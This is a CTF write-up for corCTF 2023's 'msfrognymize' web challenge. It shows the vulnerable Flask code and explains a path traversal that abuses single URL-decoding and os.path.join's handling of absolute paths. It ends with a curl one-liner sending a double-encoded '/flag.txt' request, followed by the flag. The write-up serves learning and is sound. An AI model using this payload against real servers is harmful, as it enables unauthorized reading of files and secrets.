---
title: 2023 corCTF - msfrognymize
date: 2023-07-31 00:00:00 +0700
categories:
  - Write-ups
tags:
  - 2023_corCTF
  - Web Exploitation
  - Path traversal
---

## Overview

* 64 solves / 147 points
* author: jazzpizazz

## Description

> At CoR we care greatly about privacy (especially FizzBuzz). For this reason we anonymize any selfies before sharing them on Discord. We even encrypt the metadata using a special key!

### Attached

[msfrognymize.tar.gz](https://static.cor.team/uploads/edd98f8d859b22e2924932ef6936368031f76825e6534413ca95f2c34ef0cac4/msfrognymize.tar.gz)

```python
import os
import piexif
import tempfile
import uuid

from PIL import Image, ExifTags
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import hashes, hmac
from flask import Flask, request, send_file, render_template
from urllib.parse import unquote
from werkzeug.utils import secure_filename

from celery_config import celery_app
from tasks import process_image

app = Flask(__name__)

celery_app.conf.update(app.config)

UPLOAD_FOLDER = 'uploads/'
ENCRYPTION_KEY = open("/flag.txt", "rb").readline()


def hmac_sha256(data):
    h = hmac.HMAC(ENCRYPTION_KEY, hashes.SHA256(), backend=default_backend())
    h.update(data)
    return h.finalize().hex()


def encrypt_exif_data(exif_data):
    new_exif_data = {}
    for tag, value in exif_data.items():
        if tag in ExifTags.TAGS:
            tag_name = ExifTags.TAGS[tag]
            if tag_name == "Orientation":
                new_exif_data[tag] = 1
            else:
                new_exif_data[tag] = value
        else:
            new_exif_data[tag] = hmac_sha256(value)
    return new_exif_data


@app.route('/', methods=['GET', 'POST'])
def upload_file():
    if request.method == 'POST':
        file = request.files['file']
        if file:
            try:
                img = Image.open(file)
                if img.format != "JPEG":
                    return "Please upload a valid JPEG image.", 400

                exif_data = img._getexif()
                encrypted_exif = None
                if exif_data:
                    encrypted_exif = piexif.dump(encrypt_exif_data(exif_data))
                filename = secure_filename(file.filename)
                temp_path = os.path.join(tempfile.gettempdir(), filename)
                img.save(temp_path)

                unique_id = str(uuid.uuid4())
                new_file_path = os.path.join(UPLOAD_FOLDER, f"{unique_id}.png")
                process_image.apply_async(args=[temp_path, new_file_path, encrypted_exif])

                return render_template("processing.html", image_url=f"/anonymized/{unique_id}.png")

            except Exception as e:
                return f"Error: {e}", 400

    return render_template("index.html")


@app.route('/anonymized/<image_file>')
def serve_image(image_file):
    file_path = os.path.join(UPLOAD_FOLDER, unquote(image_file))
    if ".." in file_path or not os.path.exists(file_path):
        return f"Image {file_path} cannot be found.", 404
    return send_file(file_path, mimetype='image/png')


if __name__ == '__main__':
    app.run()

```

## Analyzation

These are important lines

```python
UPLOAD_FOLDER = 'uploads/'
ENCRYPTION_KEY = open("/flag.txt", "rb").readline()

@app.route('/anonymized/<image_file>')
def serve_image(image_file):
    file_path = os.path.join(UPLOAD_FOLDER, unquote(image_file))
    if ".." in file_path or not os.path.exists(file_path):
        return f"Image {file_path} cannot be found.", 404
    return send_file(file_path, mimetype='image/png')
```

All the images are stored in ```uploads/``` directory.

When a ```GET``` request is sent to ```/anonymized/<image_file>```, it will:
- URL decode the image filename ```<image_file>```, and join the path ```UPLOAD_FOLDER``` by ```os.path.join()``` function.
- Check if ```..``` and the filepath ```uploads/<image_file>``` exists in the ```file_path``` or not.
- Send the image to the client.

[Path traversal](https://owasp.org/www-community/attacks/Path_Traversal) is the answser for this problem. But how??

- Firstly, we need to bypass the ```..``` filter. The ```unquote()``` decode only ONE TIME (!) So double encoding will work.
- Secondly, the ```os.path.join()``` function itself vulnerable. Because [python.org document](https://docs.python.org/3/library/os.path.html#os.path.join) says
```
If a segment is an absolute path (which on Windows requires both a drive and a root), then all previous segments are ignored and joining continues from the absolute path segment.
```

So just give them absolute path of flag, ```/flag.txt```.

## Solution

```sh
curl https://msfrognymize.be.ax/anonymized/%252Fflag.txt
```

The flag is
```
corctf{Fr0m_Priv4cy_t0_LFI}
```